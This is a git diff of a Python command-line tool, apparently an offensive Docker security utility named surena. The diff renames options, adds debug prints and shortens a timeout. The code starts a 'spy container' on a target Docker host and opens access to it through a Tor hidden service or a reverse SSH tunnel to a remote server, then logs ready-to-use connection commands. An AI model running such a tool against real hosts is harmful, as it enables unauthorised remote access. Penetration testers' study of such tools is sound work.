@@ -11,11 +11,11 @@ from surena.models.ssh import SSHServer
 logging.basicConfig(level=logging.INFO)
 
 
-SECONDS_OF_LIVE = 300
+# SECONDS_OF_LIVE = 300
+SECONDS_OF_LIVE = 40 
 
 
 logger = logging.getLogger()
-
 
 @click.command("get-docker-host")
 @click.option(
@@ -40,7 +40,7 @@ logger = logging.getLogger()
 )
 @click.option(
     "--ssh-server-address",
-    cls=required_if_option_has_specific_value("access_type", "reverse-ssh"),
+    cls=required_if_option_has_specific_value("access-method", "reverse-ssh"),
     show_default=True,
     help=(
         "When selecting reverse SSH as the access method, you should specify a server"
@@ -49,38 +49,38 @@ logger = logging.getLogger()
 )
 @click.option(
     "--ssh-server-username",
-    cls=required_if_option_has_specific_value("access_type", "reverse-ssh"),
+    cls=required_if_option_has_specific_value("access-method", "reverse-ssh"),
     show_default=True,
     help="The username of remote SSH server.",
 )
 @click.option(
     "--ssh-server-password",
-    cls=required_if_option_has_specific_value("access_type", "reverse-ssh"),
+    cls=required_if_option_has_specific_value("access-method", "reverse-ssh"),
     show_default=True,
     help="The password of remote SSH server.",
 )
 @click.option(
     "--ssh-server-port",
     type=Port(),
-    cls=required_if_option_has_specific_value("access_type", "reverse-ssh"),
+    cls=required_if_option_has_specific_value("access-method", "reverse-ssh"),
     default=22,
     show_default=True,
     help="The SSH port of remote SSH server.",
 )
 def get_docker_host(
-    target_address: str,
-    target_port: int,
-    connection_method: str,
-    ssh_server_name: str,
+    docker_host_address: str,
+    docker_host_port: int,
+    access_method: str,
+    ssh_server_address: str,
     ssh_server_username: str,
     ssh_server_password: str,
-    ssh_server_ssh_port: int,
+    ssh_server_port: int,
 ) -> None:
     """
     The "get-docker-host" command can show you if your Docker host has
     vulnerabilities due to misconfiguration.
     """
-    docker_client = DockerHost(target_address, target_port)
+    docker_client = DockerHost(docker_host_address, docker_host_port)
 
     print(
         'Docker host operation system is "{}".'.format(
@@ -89,7 +89,7 @@ def get_docker_host(
     )
 
     ubuntu_dockerfile_path = resource_filename(
-        "surena.models.docker",
+        "surena.models.docker_client",
         "ubuntu.Dockerfile",
     )
     image_name = docker_client.get_image_unique_name()
@@ -114,11 +114,15 @@ def get_docker_host(
     docker_host_free_port = spy_container.get_free_port_on_docker_host()
     # spy_container.add_port_to_service_ssh()
 
-    if connection_method == "tor":
+    if access_method == "tor":
         tor_port = spy_container.get_free_port_on_docker_host()
+        print('QQQQQQQQQQQQQ')
+        
+        print(docker_host_free_port, tor_port)
+        print('XXXXXXXXXXXXXXXXXXXXXXXxx')
         spy_container.config_service_tor(docker_host_free_port, tor_port)
         spy_container.start_service_tor()
-        # spy_container.wait_until_conect_to_tor_network(docker_host_free_port, tor_port)
+        spy_container.wait_until_conect_to_tor_network()
         tor_hostname = spy_container.get_tor_hostname().strip()
         logger.info(
             'Run command "torsocks ssh {}@{} -p {}" to connect to target host with'
@@ -128,8 +132,8 @@ def get_docker_host(
         )
     else:
         ssh_client = SSHServer(
-            ssh_server_name,
-            ssh_server_ssh_port,
+            ssh_server_address,
+            ssh_server_port,
             ssh_server_username,
             ssh_server_password,
         )
@@ -137,8 +141,8 @@ def get_docker_host(
         free_port_on_server = ssh_client.get_free_port()
 
         spy_container.reverse_ssh_from_docker_host_to_remote_server(
-            ssh_server_name,
-            ssh_server_ssh_port,
+            ssh_server_address,
+            ssh_server_port,
             ssh_server_username,
             ssh_server_password,
             free_port_on_server,
@@ -146,7 +150,7 @@ def get_docker_host(
         logger.info(
             'You can connect to docker host with ssh service "ssh -o '
             "'StrictHostKeyChecking no' {}@{} -p {}\" with password "
-            "{} ".format(username, ssh_server_name, free_port_on_server, password)
+            "{} ".format(username, ssh_server_address, free_port_on_server, password)
         )
 
     try:
